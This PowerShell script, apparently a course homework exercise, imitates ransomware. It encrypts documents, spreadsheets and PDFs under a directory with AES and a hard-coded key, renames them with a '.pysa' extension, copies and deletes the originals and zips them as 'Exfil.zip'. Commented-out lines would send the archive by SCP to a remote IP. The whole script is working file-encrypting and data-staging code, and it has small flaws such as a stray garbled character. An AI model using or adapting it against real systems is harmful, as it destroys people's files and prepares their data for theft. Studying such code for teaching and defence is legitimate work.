function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".pysa"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".pysa"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}

$dir_to_scan = "E:\Repositories\SYS320-Automation-Scripting\Week14\homework\Documents"

# Not going to save this to a CSV, this keeps it simpler.
$filelist = Get-ChildItem -Recurse -Include *.docx, *.pdf, *.xlsx -Path $dir_to_scan

# CSV code that isn't being used but is required for the assignemt's first task
#Get-ChildItem -Recurse -Include *.docx, *.pdf, *.txt -Path .\Documents | Export-Csv -Path files.csv
#$filelist = Import-Csv -Path .\files.csv -Header FullName

$new_location = $env:TEMPÂ + "\secret\"
mkdir $new_location

# Loop through the results
foreach ($file in $filelist) {
    # Encrypt Files
    Write-Host $file.FullName
    Invoke-AESEncryption -Mode Encrypt -Key 'p@ssw0rd' -Path $file.FullName
    Copy-Item -Path $file.FullName -Destination "$new_location\$($file.FullName)"
    Remove-Item -Path $file.FullName
}

$exfil_zip = "Exfil.zip"
# Compress the sensitive data
Compress-Archive -Path $new_location -DestinationPath $exfil_zip

# Connect to the remote server
# $credentials = Get-Credential
# $ip = '192.168.1.229'
# New-SSHSession -ComputerName $ip -Credential (Get-Credential $credentials)
# # SCP to transfer files
# Set-SCPItem -ComputerName $ip -Credential $credentials -Path $exfil_zip -Destination "/home/ubuntu"
# Remove-SSHSession -SessionId 0

